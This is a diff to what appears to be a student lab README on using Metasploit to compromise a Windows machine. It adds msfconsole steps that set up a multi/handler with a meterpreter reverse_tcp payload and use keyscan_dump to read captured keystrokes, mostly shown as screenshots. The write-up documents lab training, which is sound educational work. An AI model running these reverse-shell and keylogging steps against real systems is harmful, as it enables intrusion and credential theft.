@@ -37,7 +37,20 @@ Start apache server
 sudo systemctl apache2 start
 ![image](https://github.com/user-attachments/assets/42a365d9-0ae1-4572-a186-cd48d34f751e)
 Check the status of apache2
+![image](https://github.com/user-attachments/assets/e6ef442a-351d-484e-9bd1-bae96cac72da)
+invoke msfconsole:
+![image](https://github.com/user-attachments/assets/4d9b2ddd-a4c0-4434-a7c6-6bb64158b392)
+## OUTPUT
+![image](https://github.com/user-attachments/assets/abc2e1af-fa76-43b4-beac-c9ed33051d47)
+Starting a command and control Server use multi/handler set PAYLOAD
+windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
 
+![image](https://github.com/user-attachments/assets/11c47cce-71d4-453a-b9f0-94409937d6c6)
+## OUTPUT:
+![image](https://github.com/user-attachments/assets/3eae708c-dad1-4cf0-8ad4-0c44ddcfdaed)
+keyscan_dump shows the keystrokes captured so far
+## OUTPUT:
+![image](https://github.com/user-attachments/assets/e32e88d8-75da-41d7-8037-71805d9e0032)
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
